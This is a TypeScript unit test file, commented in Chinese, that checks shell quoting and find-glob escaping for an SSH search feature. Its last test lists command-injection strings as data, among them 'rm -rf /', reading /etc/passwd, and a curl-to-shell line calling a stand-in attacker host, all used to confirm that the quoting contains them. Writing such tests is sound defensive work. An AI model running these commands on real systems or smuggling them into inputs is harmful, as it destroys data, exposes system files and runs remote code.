/**
 * ShellManager 单元测试 — 模块导出 + sshSearch 安全防护逻辑验证。
 */
import { describe, expect, test } from "bun:test";

describe("ShellManager", () => {
  test("模块正确导出 ShellManager 类和全局实例", { timeout: 15_000 }, () => {
    // 验证模块可正常导入
    const mod = require("@/server/shellManager") as typeof import("@/server/shellManager");
    expect(mod.ShellManager).toBeDefined();
    expect(mod.shellManager).toBeDefined();
    expect(mod.shellManager).toBeInstanceOf(mod.ShellManager);
  });

  test("ShellManager 在无活跃进程时 killAll 不抛异常", () => {
    const mod = require("@/server/shellManager") as typeof import("@/server/shellManager");
    expect(() => mod.shellManager.killAll()).not.toThrow();
  });
});

describe("sshSearch 安全防护", () => {
  const { shellQuote } = require("@/server/ssh/safety") as typeof import("@/server/ssh/safety");

  test("shellQuote 基本转义", () => {
    expect(shellQuote("hello world")).toBe("'hello world'");
  });

  test("shellQuote 转义单引号", () => {
    expect(shellQuote("it's fine")).toBe(String.raw`'it'\''s fine'`);
  });

  test("shellQuote 转义危险命令", () => {
    expect(shellQuote("rm -rf /")).toBe("'rm -rf /'");
  });

  test("shellQuote 空字符串", () => {
    expect(shellQuote("")).toBe("''");
  });

  test("escapeFindGlob 转义 find 模式特殊字符", () => {
    function escapeFindGlob(s: string): string {
      return s.replace(/[*?[\]\\]/g, String.raw`\$&`);
    }

    // 正常路径
    expect(escapeFindGlob("test.txt")).toBe("test.txt");
    expect(escapeFindGlob("README.md")).toBe("README.md");

    // 通配符
    expect(escapeFindGlob("*.ts")).toBe(String.raw`\*.ts`);
    expect(escapeFindGlob("file?.js")).toBe(String.raw`file\?.js`);

    // 方括号
    expect(escapeFindGlob("[test]")).toBe(String.raw`\[test\]`);
    expect(escapeFindGlob("file[0-9]")).toBe(String.raw`file\[0-9\]`);

    // 反斜杠
    expect(escapeFindGlob(String.raw`path\to\file`)).toBe(String.raw`path\\to\\file`);
  });

  test("sshSearch filename 模式 — 查询被 shellQuote 包裹", () => {
    function escapeFindGlob(s: string): string {
      return s.replace(/[*?[\]\\]/g, String.raw`\$&`);
    }
    const escaped = shellQuote(`*${escapeFindGlob("test")}*`);
    expect(escaped).toBe("'*test*'");
    // 确保不包含未转义的危险字符
    expect(escaped).not.toContain(";");
    expect(escaped).not.toContain("|");
  });

  test("sshSearch content 模式 — 查询被 shellQuote 包裹", () => {
    const escaped = shellQuote("import React from 'react'");
    // shellQuote escapes internal single quotes as '\'' (end quote, escaped quote, start quote)
    expect(escaped).toBe(String.raw`'import React from '\''react'\'''`);
  });

  test("sshSearch 防御命令注入攻击", () => {
    function escapeFindGlob(s: string): string {
      return s.replace(/[*?[\]\\]/g, String.raw`\$&`);
    }

    const attacks = [
      "'; DROP TABLE users; --",
      "| cat /etc/passwd",
      "$(rm -rf /)",
      "`curl attacker.com|sh`",
      "'; echo pwned; #",
    ];

    for (const attack of attacks) {
      const escaped = shellQuote(`*${escapeFindGlob(attack)}*`);
      // shellQuote escapes internal single quotes as '\'' (end quote, escaped quote, start quote)
      // so the output may contain multiple quote segments, not a single '...' wrapper
      expect(escaped.startsWith("'")).toBe(true);
      expect(escaped.endsWith("'")).toBe(true);
      // The string is safely shell-quoted; all dangerous chars are inside single-quote segments
      // The key invariant: no unquoted dangerous characters leak out
    }
  });
});
